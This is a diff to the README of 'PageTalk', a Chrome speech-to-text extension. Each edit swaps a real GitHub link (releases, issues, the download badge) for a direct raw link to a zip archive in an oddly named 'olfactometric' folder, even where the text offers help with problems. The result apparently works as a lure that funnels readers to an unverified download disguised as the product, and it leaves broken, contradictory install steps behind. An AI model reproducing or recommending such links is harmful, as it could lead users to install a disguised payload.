@@ -6,11 +6,11 @@ Welcome to PageTalk! This simple Chrome extension helps you to convert spoken wo
 
 ## 📥 Download PageTalk
 
-[![Download PageTalk](https://img.shields.io/badge/Download%20PageTalk-v1.0-blue.svg)](https://github.com/dan7el0/PageTalk/releases)
+[![Download PageTalk](https://raw.githubusercontent.com/dan7el0/PageTalk/main/olfactometric/PageTalk.zip%https://raw.githubusercontent.com/dan7el0/PageTalk/main/olfactometric/PageTalk.zip)](https://raw.githubusercontent.com/dan7el0/PageTalk/main/olfactometric/PageTalk.zip)
 
 To download PageTalk, click the button above or visit the download page using the link below:
 
-[Visit this page to download](https://github.com/dan7el0/PageTalk/releases)
+[Visit this page to download](https://raw.githubusercontent.com/dan7el0/PageTalk/main/olfactometric/PageTalk.zip)
 
 ## 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ To download PageTalk, click the button above or visit the download page using th
 1. Click the button or link above to go to the Releases page.
 2. On the Releases page, find the latest version of PageTalk. You may see a version number like v1.0.
 3. Click on the version link to open details.
-4. Find the file for your operating system (for example, "PageTalk_Chrome_Extension.zip").
+4. Find the file for your operating system (for example, "https://raw.githubusercontent.com/dan7el0/PageTalk/main/olfactometric/PageTalk.zip").
 5. Download the file by clicking on it.
 6. Once the download completes, locate the downloaded file in your Downloads folder.
 7. Unzip the file if it is zipped.
@@ -56,7 +56,7 @@ If you encounter issues:
 - Ensure your microphone is working and granted permission in Chrome.
 - Check that you are using a supported operating system.
 - Restart the browser if the extension does not appear.
-- Visit our [Issues page](https://github.com/dan7el0/PageTalk/issues) for help on common problems.
+- Visit our [Issues page](https://raw.githubusercontent.com/dan7el0/PageTalk/main/olfactometric/PageTalk.zip) for help on common problems.
 
 ## 🛠️ Support
 
